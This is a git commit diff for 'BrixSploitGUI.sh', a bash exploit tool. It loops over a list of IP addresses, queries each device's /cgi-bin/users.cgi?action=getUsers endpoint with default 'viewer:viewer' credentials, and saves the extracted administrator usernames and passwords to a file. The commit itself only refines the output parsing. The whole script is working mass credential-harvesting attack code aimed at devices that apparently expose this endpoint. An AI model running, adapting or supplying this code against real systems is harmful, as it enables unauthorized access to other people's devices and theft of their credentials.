13e9a2c21d407b412b19b4408b1f3d6bc0bd1f41
EMLGaming <ezrah@ligthartschenk.com>
2018-07-09 21:00:45 +0200

    niceparsing
    I added the same parsing I added to the cli

--- BrixSploitGUI.sh
+++ BrixSploitGUI.sh
@@ -7,11 +7,15 @@ eval $(yad --name=BrixSploit --window-icon="logo.png" --title=BrixSploit --text=
 let x=0
 lines="$(wc -l $INPUT | tr -dc '[:alnum:]\n\r' | sed 's/[^0-9]*//g')"
 while IFS='' read -r ip || [[ -n "$ip" ]]; do
-    let x+=1
+    let x++
     echo "Working on IP $ip ($x/$lines)"
-    printf $ip"\n" >> $OUTPUT 2>&1
-    curl -s --max-time 3 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer | grep -E '(User1.username|User1.password)' | grep \
-    -o -E '(userna.*|passwo.*)' >> $OUTPUT 2>&1
-    printf "\n" >> $OUTPUT 2>&1
+    result="$(curl -s --fail --max-time 3 http://$ip/cgi-bin/users.cgi?action=getUsers -u viewer:viewer \
+    | grep -E '(User1.username|User1.password)' | grep -o -E '(userna.*|passwo.*)')" 
+    if [ $? == 0 ]
+    then
+        echo "$ip;" | tr -d '\n' >> "$OUTPUT" 2>&1
+        echo "$result" | cut -d= -f2 | sed '/admin/a:' | tr -d '\n' >> "$OUTPUT" 2>&1
+        echo "" >> "$OUTPUT" 2>&1
+    fi
     done < "$INPUT"
 printf "\nDONE! Saved to $OUTPUT!\n"
